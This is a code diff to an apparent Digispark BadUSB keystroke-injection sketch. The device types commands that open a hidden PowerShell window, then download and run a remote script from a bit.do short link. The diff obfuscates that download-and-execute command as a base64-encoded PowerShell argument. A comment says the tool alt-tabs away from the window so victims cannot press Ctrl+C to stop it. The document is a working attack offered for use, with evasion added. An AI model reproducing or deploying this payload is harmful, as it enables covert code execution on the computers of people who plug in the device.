@@ -12,11 +12,11 @@ void setup() { // The code goes inside setup since it should only run once.
     // Open a hidden Powershell window
     DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
     DigiKeyboard.delay(250);
-    DigiKeyboard.println("powershell -W h"); // PowerShell.exe -WindowStyle Hidden
+    DigiKeyboard.println("powershell /W h"); // PowerShell.exe -WindowStyle Hidden
     DigiKeyboard.delay(1000);
 
-    // Download and run the rest of the script
-    DigiKeyboard.println("iex(iwr -useb bit.do/eSLgf)");
+    // Download and run the rest of the script (encoded version of 'iex(iwr -useb bit.do/eSLgf)')
+    DigiKeyboard.println("powershell /e aQBlAHgAKABpAHcAcgAgAC0AdQBzAGUAYgAgAGIAaQB0AC4AZABvAC8AZQBTAEwAZwBmACkA");
 
     // Alt-Tab away from the PS window (So people can't do Ctrl+C to stop it)
     DigiKeyboard.delay(100);
